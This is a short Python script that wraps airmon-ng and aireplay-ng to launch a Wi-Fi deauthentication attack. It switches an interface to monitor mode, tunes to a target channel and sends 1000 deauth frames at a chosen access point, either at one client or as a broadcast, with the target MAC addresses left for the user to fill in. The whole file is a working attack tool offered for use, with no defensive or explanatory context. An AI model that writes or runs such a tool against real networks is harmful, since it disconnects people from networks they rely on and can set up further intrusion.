import os
import subprocess
import time
 
# CHANGE THESE
interface = "wlan0"            # Your wireless interface
monitor_iface = "wlan0mon"     # What it becomes in monitor mode
target_bssid = "AA:BB:CC:DD:EE:FF"  # Target router/AP MAC address
target_channel = 6             # Target channel
client_mac = "FF:EE:DD:CC:BB:AA"    # Optional (for targeted deauth)
packet_count = 1000            # Number of deauth packets
 
def run_cmd(cmd):
    print(f"[*] Running: {cmd}")
    subprocess.call(cmd, shell=True)
 
def start_monitor_mode():
    run_cmd(f"airmon-ng start {interface}")
    time.sleep(2)
 
def stop_monitor_mode():
    run_cmd(f"airmon-ng stop {monitor_iface}")
    time.sleep(2)
 
def set_channel():
    run_cmd(f"iwconfig {monitor_iface} channel {target_channel}")
 
def launch_deauth():
    print("[*] Launching Deauth Attack...")
    if client_mac:
        # Targeted attack
        cmd = f"aireplay-ng --deauth {packet_count} -a {target_bssid} -c {client_mac} {monitor_iface}"
    else:
        # Broadcast deauth
        cmd = f"aireplay-ng --deauth {packet_count} -a {target_bssid} {monitor_iface}"
    run_cmd(cmd)
 
# ------- Main Flow -------
try:
    start_monitor_mode()
    set_channel()
    launch_deauth()
finally:
    stop_monitor_mode()
